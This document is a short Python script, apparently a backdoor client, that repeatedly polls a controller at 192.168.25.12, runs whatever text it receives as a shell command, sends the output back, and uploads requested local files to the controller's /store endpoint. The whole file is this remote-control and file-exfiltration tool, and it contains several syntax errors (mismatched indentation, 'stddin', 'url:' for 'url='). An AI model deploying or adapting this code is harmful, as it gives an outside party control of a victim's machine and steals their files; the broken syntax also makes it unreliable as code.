import requests
import os
import time 
import subprocess

while True:
    
    req = requests.get('http://192.168.25.12')
    command = req.text
    
    if 'terminate' in command:
        break
    elif 'download' in command:
       grab,path = command.split('*')
       
        if os.path.exists(path):
          
            url = 'http://192.168.25.12/store'
            files = {'file':open(path, 'rb')}
            r = requests.post(url, files=files)
        else:
          post_response = requests.post(url='http://192.168.25.12',data=' %%%% Not able to find the file %%%%')
     
     else:
        CMD = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stddin=subprocess.PIPE)
        post_response = requests.post(url:'http://192.168.25.12',data=CMD.stdout.read())
        post_response = requests.post(url:'http://192.168.25.12',data=CMD.stderr.read())
        
     time.sleep(3)
